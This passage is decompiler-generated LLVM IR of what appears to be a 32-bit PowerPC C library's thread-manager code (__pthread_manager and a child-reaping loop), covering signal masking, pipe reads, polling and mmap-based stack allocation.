  %v2_10015fd810 = icmp sgt i32 %v3_10015fd49, 0
  br i1 %v2_10015fd810, label %dec_label_pc_10015f74, label %dec_label_pc_10015fe0

dec_label_pc_10015f74:                            ; preds = %entry, %dec_label_pc_10015fc4.backedge
  %v3_10015f78 = load i32, i32* @global_var_10045204.1059, align 4
  %v3_10015f7c = icmp eq i32 %v3_10015f78, 0
  br i1 %v3_10015f7c, label %dec_label_pc_10015f9c, label %dec_label_pc_10015f84

dec_label_pc_10015f84:                            ; preds = %dec_label_pc_10015f74
  %v3_10015ecc = load i32, i32* @global_var_100450e0, align 4
  store i32 %v3_10015ecc, i32* @r3, align 4
  store i32 268525468, i32* @lr, align 4
  %v0_10015f98 = call i32 @restart.4()
  br label %dec_label_pc_10015f9c

dec_label_pc_10015f9c:                            ; preds = %dec_label_pc_10015f74, %dec_label_pc_10015f84
  %v3_10015f9c = load i32, i32* %stack_var_-40, align 4
  %v1_10015fa0 = urem i32 %v3_10015f9c, 128
  %v1_10015fa4 = mul nuw nsw i32 %v1_10015fa0, 16777216
  %v1_10015fa8 = add nuw i32 %v1_10015fa4, 16777216
  %v2_10015fa8 = sdiv i32 %v1_10015fa8, 16777216
  %v1_10015fac = udiv i32 %v2_10015fa8, 2
  %v2_10015fac = and i32 %v2_10015fa8, -2147483648
  %v3_10015fac = or i32 %v1_10015fac, %v2_10015fac
  %tmp8 = icmp slt i32 %v3_10015fac, 1
  br i1 %tmp8, label %dec_label_pc_10015fc4.backedge, label %dec_label_pc_10015fb4

dec_label_pc_10015fb4:                            ; preds = %dec_label_pc_10015f9c
  store i32 ptrtoint ([3 x i8]* @global_var_10015fbc.1063 to i32), i32* @lr, align 4
  %v2_10015fb8 = call i32 @pthread_kill_all_threads(i32 %v1_10015fa0, i32 1)
  %v1_10015fc0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10015fc4.backedge

dec_label_pc_10015fc4.backedge:                   ; preds = %dec_label_pc_10015fb4, %dec_label_pc_10015f9c
  store i32 -2147483647, i32* @r5, align 4
  store i32 %v2_10015fd0, i32* @r4, align 4
  store i32 268525528, i32* @lr, align 4
  %v3_10015fd4 = call i32 @__libc_waitpid(i32 -1, i32 %v2_10015fd0, i32 -2147483647)
  %v2_10015fd8 = icmp sgt i32 %v3_10015fd4, 0
  br i1 %v2_10015fd8, label %dec_label_pc_10015f74, label %dec_label_pc_10015fe0

dec_label_pc_10015fe0:                            ; preds = %dec_label_pc_10015fc4.backedge, %entry
  %v3_10015fd4.lcssa = phi i32 [ %v3_10015fd49, %entry ], [ %v3_10015fd4, %dec_label_pc_10015fc4.backedge ]
  ret i32 %v3_10015fd4.lcssa

; uselistorder directives
  uselistorder i32 %v2_10015fa8, { 1, 0 }
  uselistorder i32 %v2_10015fd0, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 0, 1 }
  uselistorder i32 268525528, { 1, 0 }
  uselistorder i32 -2147483647, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10015f9c, { 1, 0 }
  uselistorder label %dec_label_pc_10015f74, { 1, 0 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-360 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  store i32 268697600, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10040ac0.1013 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10040b08.1064 to i32), i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10040b10.1065 to i32), i32* %r0.global-to-local, align 4
  %v2_10016014 = ptrtoint i32* %stack_var_-352 to i32
  store i32 ptrtoint (i32* @global_var_10040b10.1065 to i32), i32* @global_var_10040b0c.1066, align 4
  store i32 ptrtoint (i32* @global_var_10040ac0.1013 to i32), i32* @r2, align 4
  store i32 ptrtoint (i32* @global_var_10040b08.1064 to i32), i32* bitcast (i32** @global_var_10040b04.1067 to i32*), align 4
  store i32 %arg1, i32* %r21.global-to-local, align 4
  store i32 %v2_10016014, i32* @r3, align 4
  store i32 268525616, i32* @lr, align 4
  %v1_1001602c = call i32 @sigfillset(i32 %v2_10016014)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016034 = load i32, i32* @global_var_10045108.994, align 4
  store i32 %v3_10016034, i32* %r4.global-to-local, align 4
  store i32 %v2_10016014, i32* @r3, align 4
  store i32 268525632, i32* @lr, align 4
  %v1_1001603c = call i32 @__GI_sigdelset(i32 %v2_10016014)
  store i32 %v2_10016014, i32* @r3, align 4
  store i32 5, i32* %r4.global-to-local, align 4
  store i32 268525644, i32* @lr, align 4
  %v1_10016048 = call i32 @__GI_sigdelset(i32 %v2_10016014)
  store i32 %v1_10016048, i32* %r3.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016050 = load i32, i32* @global_var_1004521c.1021, align 4
  store i32 %v3_10016050, i32* %r0.global-to-local, align 4
  %v3_10016054 = icmp eq i32 %v3_10016050, 0
  store i1 %v3_10016054, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016054, label %dec_label_pc_10016074, label %dec_label_pc_1001605c

dec_label_pc_1001605c:                            ; preds = %entry
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016060 = load i32, i32* @global_var_1004510c.995, align 4
  store i32 %v3_10016060, i32* %r4.global-to-local, align 4
  %v3_10016064 = icmp eq i32 %v3_10016060, 0
  store i1 %v3_10016064, i1* %cr7_eq.global-to-local, align 1
  %tmp26 = icmp slt i32 %v3_10016060, 1
  br i1 %tmp26, label %dec_label_pc_10016074, label %dec_label_pc_1001606c

dec_label_pc_1001606c:                            ; preds = %dec_label_pc_1001605c
  store i32 %v2_10016014, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016074.1068 to i32), i32* @lr, align 4
  %v1_10016070 = call i32 @__GI_sigdelset(i32 %v2_10016014)
  store i32 %v1_10016070, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016074

dec_label_pc_10016074:                            ; preds = %dec_label_pc_1001605c, %entry, %dec_label_pc_1001606c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v2_10016014, i32* %r4.global-to-local, align 4
  store i32 268525700, i32* @lr, align 4
  %v3_10016080 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10016014, i32 0)
  store i32 %v3_10016080, i32* %r3.global-to-local, align 4
  %v3_10016088 = load i32, i32* @global_var_100450e0, align 4
  store i32 %v3_10016088, i32* %r9.global-to-local, align 4
  %v1_1001608c = add i32 %v3_10016088, 24
  %v2_1001608c = inttoptr i32 %v1_1001608c to i32*
  %v3_1001608c = load i32, i32* %v2_1001608c, align 4
  store i32 %v3_1001608c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016094.1069 to i32), i32* @lr, align 4
  %v1_10016090 = call i32 @__pthread_manager_adjust_prio(i32 %v3_1001608c)
  store i32 %v1_10016090, i32* %r3.global-to-local, align 4
  %v2_10016094 = ptrtoint i32* %stack_var_-224 to i32
  br label %dec_label_pc_10016094

dec_label_pc_10016094:                            ; preds = %dec_label_pc_100160b0, %dec_label_pc_10016074
  %v0_10016098 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_10016098, i32* %r3.global-to-local, align 4
  store i32 %v2_10016094, i32* %r4.global-to-local, align 4
  store i32 268525736, i32* @lr, align 4
  %v1_100160a4 = call i32 @__libc_read(i32 %v0_10016098)
  store i32 %v1_100160a4, i32* %r3.global-to-local, align 4
  %v3_100160a8 = icmp eq i32 %v1_100160a4, -1
  store i1 %v3_100160a8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100160a8, label %dec_label_pc_100160b0, label %dec_label_pc_100160c0

dec_label_pc_100160b0:                            ; preds = %dec_label_pc_10016094
  %v0_100160b0 = call i32 @__errno_location()
  store i32 %v0_100160b0, i32* %r3.global-to-local, align 4
  %v1_100160b4 = inttoptr i32 %v0_100160b0 to i32*
  %v2_100160b4 = load i32, i32* %v1_100160b4, align 4
  store i32 %v2_100160b4, i32* %r0.global-to-local, align 4
  %v3_100160b8 = icmp eq i32 %v2_100160b4, 4
  store i1 %v3_100160b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100160b8, label %dec_label_pc_10016094, label %dec_label_pc_100160c0

dec_label_pc_100160c0:                            ; preds = %dec_label_pc_10016094, %dec_label_pc_100160b0
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100160c4 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_100160c4, i32* %stack_var_-360, align 4
  %v2_100160d4 = ptrtoint i32* %stack_var_-360 to i32
  %v4_10016120 = zext i16 %tmp17 to i32
  %tmp = urem i16 %tmp17, 2
  %v1_10016124 = zext i16 %tmp to i32
  %v3_10016124 = icmp eq i16 %tmp, 0
  %v2_10016140 = icmp ugt i32 %tmp16, 5
  %v3_10016140 = icmp eq i32 %tmp16, 5
  %v2_100163dc = ptrtoint i32* %stack_var_-204 to i32
  %v1_1001614c = mul i32 %tmp16, 4
  %v2_10016154 = add i32 %v1_1001614c, ptrtoint (i32* @global_var_1002e0b8.1071 to i32)
  %v3_10016154 = inttoptr i32 %v2_10016154 to i32*
  br label %dec_label_pc_100160cc

dec_label_pc_100160cc:                            ; preds = %dec_label_pc_10016118, %dec_label_pc_1001612c, %dec_label_pc_10016120, %dec_label_pc_1001668c, %dec_label_pc_100160c0
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 %v2_100160d4, i32* %r3.global-to-local, align 4
  store i32 268525788, i32* @lr, align 4
  %v3_100160d8 = call i32 @__libc_poll(i32 %v2_100160d4, i32 1, i32 2000)
  store i32 %v3_100160d8, i32* %r3.global-to-local, align 4
  store i32 %v3_100160d8, i32* @r31, align 4
  store i32 268525796, i32* @lr, align 4
  %v0_100160e0 = call i32 @getppid()
  store i32 %v0_100160e0, i32* %r3.global-to-local, align 4
  %v3_100160e4 = icmp eq i32 %v0_100160e0, 1
  store i1 %v3_100160e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100160e4, label %dec_label_pc_100160ec, label %dec_label_pc_100160fc

dec_label_pc_100160ec:                            ; preds = %dec_label_pc_100160cc
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100160f8.1070 to i32), i32* @lr, align 4
  %v2_100160f4 = call i32 @pthread_kill_all_threads(i32 9, i32 0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016664 = call i32 @__GI__exit(i32 0)
  store i32 %v1_10016664, i32* %r3.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @global_var_10045204.1059, align 4
  store i32 268527224, i32* @lr, align 4
  %v2_10016674 = call i32 @pthread_reap_children(i32 %v1_10016664, i32 268697600)
  %v3_1001667c = load i32, i32* @global_var_100450e0, align 4
  store i32 %v3_1001667c, i32* %r9.global-to-local, align 4
  store i32 %v3_1001667c, i32* @r3, align 4
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001668c

dec_label_pc_100160fc:                            ; preds = %dec_label_pc_100160cc
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016100 = load i32, i32* @global_var_10045200.1058, align 4
  store i32 %v3_10016100, i32* %r0.global-to-local, align 4
  %v3_10016104 = icmp eq i32 %v3_10016100, 0
  store i1 %v3_10016104, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016104, label %dec_label_pc_10016118, label %dec_label_pc_1001610c

dec_label_pc_1001610c:                            ; preds = %dec_label_pc_100160fc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @global_var_10045200.1058, align 4
  store i32 268525848, i32* @lr, align 4
  %v2_10016114 = call i32 @pthread_reap_children(i32 %v0_100160e0, i32 268697600)
  store i32 %v2_10016114, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016118

dec_label_pc_10016118:                            ; preds = %dec_label_pc_100160fc, %dec_label_pc_1001610c
  %v0_10016118 = load i32, i32* @r31, align 4
  %v3_10016118 = icmp eq i32 %v0_10016118, 1
  store i1 %v3_10016118, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016118, label %dec_label_pc_10016120, label %dec_label_pc_100160cc

dec_label_pc_10016120:                            ; preds = %dec_label_pc_10016118
  store i32 %v4_10016120, i32* %r0.global-to-local, align 4
  store i32 %v1_10016124, i32* %r9.global-to-local, align 4
  br i1 %v3_10016124, label %dec_label_pc_100160cc, label %dec_label_pc_1001612c

dec_label_pc_1001612c:                            ; preds = %dec_label_pc_10016120
  %v0_1001612c = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_1001612c, i32* %r3.global-to-local, align 4
  store i32 %v2_10016094, i32* %r4.global-to-local, align 4
  store i32 268525884, i32* @lr, align 4
  %v1_10016138 = call i32 @__libc_read(i32 %v0_1001612c)
  store i32 %v1_10016138, i32* %r3.global-to-local, align 4
  store i32 %tmp16, i32* %r0.global-to-local, align 4
  store i1 %v3_10016140, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10016140, label %dec_label_pc_100160cc, label %dec_label_pc_10016148

dec_label_pc_10016148:                            ; preds = %dec_label_pc_1001612c
  store i32 %v1_1001614c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002e0b8.1071 to i32), i32* %r9.global-to-local, align 4
  %v4_10016154 = load i32, i32* %v3_10016154, align 4
  %v2_10016158 = add i32 %v4_10016154, ptrtoint (i32* @global_var_1002e0b8.1071 to i32)
  store i32 %v2_10016158, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_10016158)
  store i32 268525932, i32* @lr, align 4
  %v0_10016168 = call i32 @__GI_getpagesize()
  store i32 %v0_10016168, i32* %r3.global-to-local, align 4
  %v3_1001616c = load i32, i32* %stack_var_-224, align 4
  store i32 %v3_1001616c, i32* %r23.global-to-local, align 4
  store i32 %v0_10016168, i32* %r27.global-to-local, align 4
  %v0_10016174 = load i32, i32* @r30, align 4
  %v3_10016174 = icmp eq i32 %v0_10016174, 0
  store i1 %v3_10016174, i1* %cr7_eq.global-to-local, align 1
  %v1_10016180 = add i32 %v3_1001616c, 20
  %v2_10016180 = inttoptr i32 %v1_10016180 to i32*
  %v3_10016180 = load i32, i32* %v2_10016180, align 4
  store i32 %v3_10016180, i32* %r22.global-to-local, align 4
  %v1_10016184 = add i32 %v3_1001616c, 412
  %v2_10016184 = inttoptr i32 %v1_10016184 to i32*
  %v3_10016184 = load i32, i32* %v2_10016184, align 4
  store i32 %v3_10016184, i32* %r18.global-to-local, align 4
  br i1 %v3_10016174, label %dec_label_pc_100161ac.preheader, label %dec_label_pc_1001618c

dec_label_pc_1001618c:                            ; preds = %dec_label_pc_10016148
  %v1_1001618c = add i32 %v0_10016174, 4
  %v2_1001618c = inttoptr i32 %v1_1001618c to i32*
  %v3_1001618c = load i32, i32* %v2_1001618c, align 4
  store i32 %v3_1001618c, i32* %r0.global-to-local, align 4
  %v3_10016190 = icmp eq i32 %v3_1001618c, 0
  store i1 %v3_10016190, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016190, label %dec_label_pc_100161ac.preheader, label %dec_label_pc_10016198

dec_label_pc_10016198:                            ; preds = %dec_label_pc_1001618c
  store i32 268525980, i32* @lr, align 4
  %v0_10016198 = call i32 @geteuid()
  %v3_1001619c = icmp eq i32 %v0_10016198, 0
  store i1 %v3_1001619c, i1* %cr7_eq.global-to-local, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_1001619c, label %dec_label_pc_100161ac.preheader, label %dec_label_pc_1001657c

dec_label_pc_100161ac.preheader:                  ; preds = %dec_label_pc_10016198, %dec_label_pc_1001618c, %dec_label_pc_10016148
  store i32 2, i32* %r24.global-to-local, align 4
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100161b4

dec_label_pc_100161b4:                            ; preds = %dec_label_pc_100161ac.preheader, %dec_label_pc_100162d0
  %v0_10016258 = phi i32 [ 2, %dec_label_pc_100161ac.preheader ], [ %v1_100162d0, %dec_label_pc_100162d0 ]
  %v1_100161b8 = mul i32 %v0_10016258, 16
  store i32 ptrtoint (i32* @global_var_10040d60.1027 to i32), i32* %r9.global-to-local, align 4
  %v2_100161c0 = add i32 %v1_100161b8, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %v2_100161c0, i32* %r11.global-to-local, align 4
  %v1_100161c4 = add i32 %v1_100161b8, add (i32 ptrtoint (i32* @global_var_10040d60.1027 to i32), i32 8)
  %v2_100161c4 = inttoptr i32 %v1_100161c4 to i32*
  %v3_100161c4 = load i32, i32* %v2_100161c4, align 4
  store i32 %v3_100161c4, i32* %r0.global-to-local, align 4
  %v3_100161c8 = icmp eq i32 %v3_100161c4, 0
  store i1 %v3_100161c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100161c8, label %dec_label_pc_100161d0, label %dec_label_pc_100162d0

dec_label_pc_100161d0:                            ; preds = %dec_label_pc_100161b4
  %v0_100161d0 = load i32, i32* @r30, align 4
  %v3_100161d0 = icmp eq i32 %v0_100161d0, 0
  store i1 %v3_100161d0, i1* %cr7_eq.global-to-local, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100161d8 = load i32, i32* @global_var_100451dc.996, align 4
  store i32 %v3_100161d8, i32* %r11.global-to-local, align 4
  br i1 %v3_100161d0, label %dec_label_pc_10016218, label %dec_label_pc_100161e0

dec_label_pc_100161e0:                            ; preds = %dec_label_pc_100161d0
  %v1_100161e0 = add i32 %v0_100161d0, 24
  %v2_100161e0 = inttoptr i32 %v1_100161e0 to i32*
  %v3_100161e0 = load i32, i32* %v2_100161e0, align 4
  store i32 %v3_100161e0, i32* %r0.global-to-local, align 4
  %v3_100161e4 = icmp eq i32 %v3_100161e0, 0
  store i1 %v3_100161e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100161e4, label %dec_label_pc_10016218, label %dec_label_pc_100161ec

dec_label_pc_100161ec:                            ; preds = %dec_label_pc_100161e0
  %v1_100161ec = add i32 %v0_100161d0, 28
  %v2_100161ec = inttoptr i32 %v1_100161ec to i32*
  %v3_100161ec = load i32, i32* %v2_100161ec, align 4
  store i32 %v3_100161ec, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  %v1_100161f4 = add i32 %v0_100161d0, 32
  %v2_100161f4 = inttoptr i32 %v1_100161f4 to i32*
  %v3_100161f4 = load i32, i32* %v2_100161f4, align 4
  store i32 %v3_100161f4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  %v1_100161fc = call i32 @__asm_rlwinm(i32 %v3_100161ec, i32 0, i32 0, i32 29)
  store i32 %v1_100161fc, i32* %r11.global-to-local, align 4
  %v0_10016200 = load i32, i32* %r9.global-to-local, align 4
  %v2_10016200 = sub i32 %v3_100161ec, %v0_10016200
  store i32 %v2_10016200, i32* %r27.global-to-local, align 4
  %v1_10016204 = add i32 %v1_100161fc, -480
  store i32 %v1_10016204, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 1, i32* @global_var_1004520c.1072, align 4
  br label %dec_label_pc_100162d8

dec_label_pc_10016218:                            ; preds = %dec_label_pc_100161e0, %dec_label_pc_100161d0
  store i1 %v3_100161d0, i1* %cr7_eq.global-to-local, align 1
  store i32 2097152, i32* %r0.global-to-local, align 4
  %v0_10016220 = load i32, i32* %r27.global-to-local, align 4
  %v2_10016220 = sub i32 2097152, %v0_10016220
  store i32 %v2_10016220, i32* %r29.global-to-local, align 4
  br i1 %v3_100161d0, label %dec_label_pc_10016248, label %dec_label_pc_10016228

dec_label_pc_10016228:                            ; preds = %dec_label_pc_10016218
  %v1_10016228 = add i32 %v0_100161d0, 32
  %v2_10016228 = inttoptr i32 %v1_10016228 to i32*
  %v3_10016228 = load i32, i32* %v2_10016228, align 4
  %v2_1001622c = add i32 %v0_10016220, -1
  %v1_10016230 = add i32 %v2_1001622c, %v3_10016228
  %v2_10016234 = urem i32 %v1_10016230, %v0_10016220
  %v2_10016238 = sub i32 %v1_10016230, %v2_10016234
  store i32 %v2_10016238, i32* %r9.global-to-local, align 4
  %v2_1001623c = icmp ult i32 %v2_10016220, %v2_10016238
  %v4_1001623c = icmp eq i32 %v2_10016220, %v2_10016238
  store i1 %v4_1001623c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001623c, label %dec_label_pc_10016248, label %dec_label_pc_1001624c

dec_label_pc_10016248:                            ; preds = %dec_label_pc_10016228, %dec_label_pc_10016218
  br label %dec_label_pc_1001624c

dec_label_pc_1001624c:                            ; preds = %dec_label_pc_10016228, %dec_label_pc_10016248
  %storemerge = phi i32 [ %v2_10016220, %dec_label_pc_10016248 ], [ %v2_10016238, %dec_label_pc_10016228 ]
  store i32 %storemerge, i32* @r31, align 4
  %v3_10016254 = load i32, i32* @global_var_10045254.1006, align 4
  %tmp29 = mul i32 %v0_10016258, -2097152
  %v2_1001625c = add i32 %v3_100161d8, %tmp29
  store i32 306, i32* %r6.global-to-local, align 4
  %v1_10016264 = add i32 %v2_1001625c, 2097152
  store i32 %v1_10016264, i32* %r9.global-to-local, align 4
  %v1_10016268 = mul i32 %v3_10016254, 4
  store i32 %v1_10016268, i32* %r4.global-to-local, align 4
  %v2_1001626c = sub i32 %v1_10016264, %v1_10016268
  store i32 %v2_1001626c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v1_10016278 = add i32 %v2_1001625c, 2096672
  store i32 %v1_10016278, i32* %r28.global-to-local, align 4
  store i32 268526208, i32* @lr, align 4
  %v7_1001627c = call i32 @mmap(i32 %v2_1001626c, i32 %v1_10016268, i32 7, i32 306, i32 -1, i32 0, i32 %v1_10016264)
  store i32 %v7_1001627c, i32* %r3.global-to-local, align 4
  %v3_10016280 = icmp eq i32 %v7_1001627c, -1
  store i1 %v3_10016280, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016280, label %dec_label_pc_1001624c.dec_label_pc_100162d0_crit_edge, label %dec_label_pc_10016288

dec_label_pc_1001624c.dec_label_pc_100162d0_crit_edge: ; preds = %dec_label_pc_1001624c
  %v0_100162d0.pre = load i32, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_100162d0

dec_label_pc_10016288:                            ; preds = %dec_label_pc_1001624c
  %v0_10016288 = load i32, i32* @r31, align 4
  %v1_10016288 = load i32, i32* %r29.global-to-local, align 4
  %v4_10016288 = icmp eq i32 %v0_10016288, %v1_10016288
  store i1 %v4_10016288, i1* %cr7_eq.global-to-local, align 1
  %v1_1001628c = load i32, i32* %r28.global-to-local, align 4
  %v2_1001628c = sub i32 %v1_1001628c, %v0_10016288
  store i32 %v2_1001628c, i32* %r9.global-to-local, align 4
  %v1_10016290 = add i32 %v2_1001628c, 480
  store i32 %v1_10016290, i32* %r27.global-to-local, align 4
  br i1 %v4_10016288, label %dec_label_pc_100162c4, label %dec_label_pc_10016298

dec_label_pc_10016298:                            ; preds = %dec_label_pc_10016288
  %v0_10016298 = load i32, i32* @r30, align 4
  %v1_10016298 = add i32 %v0_10016298, 20
  %v2_10016298 = inttoptr i32 %v1_10016298 to i32*
  %v3_10016298 = load i32, i32* %v2_10016298, align 4
  store i32 %v3_10016298, i32* %r26.global-to-local, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_100162a8 = sub i32 %v1_10016290, %v3_10016298
  store i32 %v2_100162a8, i32* %r25.global-to-local, align 4
  store i32 %v3_10016298, i32* %r4.global-to-local, align 4
  store i32 %v2_100162a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 268526268, i32* @lr, align 4
  %v7_100162b8 = call i32 @mmap(i32 %v2_100162a8, i32 %v3_10016298, i32 0, i32 16, i32 -1, i32 0, i32 %v2_1001628c)
  store i32 %v7_100162b8, i32* %r3.global-to-local, align 4
  %v3_100162bc = icmp eq i32 %v7_100162b8, -1
  store i1 %v3_100162bc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100162bc, label %dec_label_pc_100162c4, label %dec_label_pc_100162d8

dec_label_pc_100162c4:                            ; preds = %dec_label_pc_10016298, %dec_label_pc_10016288
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_100162d8

dec_label_pc_100162d0:                            ; preds = %dec_label_pc_1001624c.dec_label_pc_100162d0_crit_edge, %dec_label_pc_100161b4
  %v0_100162d0 = phi i32 [ %v0_100162d0.pre, %dec_label_pc_1001624c.dec_label_pc_100162d0_crit_edge ], [ %v0_10016258, %dec_label_pc_100161b4 ]
  %v1_100162d0 = add i32 %v0_100162d0, 1
  store i32 %v1_100162d0, i32* %r24.global-to-local, align 4
  %v2_100161ac = icmp ugt i32 %v1_100162d0, 1023
  %v3_100161ac = icmp eq i32 %v1_100162d0, 1023
  store i1 %v3_100161ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100161ac, label %dec_label_pc_10016568, label %dec_label_pc_100161b4

dec_label_pc_100162d8:                            ; preds = %dec_label_pc_10016298, %dec_label_pc_100162c4, %dec_label_pc_100161ec
  %v0_100162d8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100162d8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 480, i32* @r5, align 4
  store i32 %v0_100162d8, i32* @r31, align 4
  store i32 268526316, i32* @lr, align 4
  %v0_100162e8 = call i32 @__GI_memset()
  store i32 268697600, i32* %r3.global-to-local, align 4
  %v3_100162f4 = load i32, i32* @global_var_10045208.1073, align 4
  %v3_100162f8 = load i32, i32* @global_var_10045120.1061, align 4
  %v0_100162fc = load i32, i32* @r30, align 4
  %v3_100162fc = icmp eq i32 %v0_100162fc, 0
  store i1 %v3_100162fc, i1* %cr7_eq.global-to-local, align 1
  %v1_10016304 = add i32 %v3_100162f4, 1024
  store i32 %v1_10016304, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10040d60.1027 to i32), i32* %r8.global-to-local, align 4
  %v0_1001630c = load i32, i32* %r24.global-to-local, align 4
  %v1_1001630c = mul i32 %v0_1001630c, 16
  store i32 %v1_1001630c, i32* %r29.global-to-local, align 4
  %v0_10016310 = load i32, i32* @r31, align 4
  %v1_10016310 = add i32 %v0_10016310, 72
  %v1_10016314 = add i32 %v3_100162f8, 1
  store i32 %v1_10016314, i32* %r9.global-to-local, align 4
  store i32 %v1_10016314, i32* @global_var_10045120.1061, align 4
  %v2_1001631c = add i32 %v1_1001630c, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %v2_1001631c, i32* @r10, align 4
  store i32 %v1_10016304, i32* @global_var_10045208.1073, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_10016328 = add i32 %v0_10016310, 68
  %v3_10016328 = inttoptr i32 %v2_10016328 to i32*
  store i32 %v1_10016310, i32* %v3_10016328, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_10016330 = load i32, i32* %r24.global-to-local, align 4
  %v1_10016330 = load i32, i32* %r11.global-to-local, align 4
  %v2_10016330 = add i32 %v1_10016330, %v0_10016330
  store i32 %v2_10016330, i32* %r28.global-to-local, align 4
  %v0_10016334 = load i32, i32* @r31, align 4
  %v1_10016334 = add i32 %v0_10016334, 80
  store i32 %v1_10016334, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1001633c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001633c = trunc i32 %v0_1001633c to i8
  %v3_1001633c = add i32 %v0_10016334, 65
  %v4_1001633c = inttoptr i32 %v3_1001633c to i8*
  store i8 %v1_1001633c, i8* %v4_1001633c, align 1
  %v0_10016340 = load i32, i32* %r7.global-to-local, align 4
  %v1_10016340 = load i32, i32* @r31, align 4
  %v2_10016340 = add i32 %v1_10016340, 76
  %v3_10016340 = inttoptr i32 %v2_10016340 to i32*
  store i32 %v0_10016340, i32* %v3_10016340, align 4
  %v0_10016344 = load i32, i32* %r25.global-to-local, align 4
  %v1_10016344 = load i32, i32* @r31, align 4
  %v2_10016344 = add i32 %v1_10016344, 396
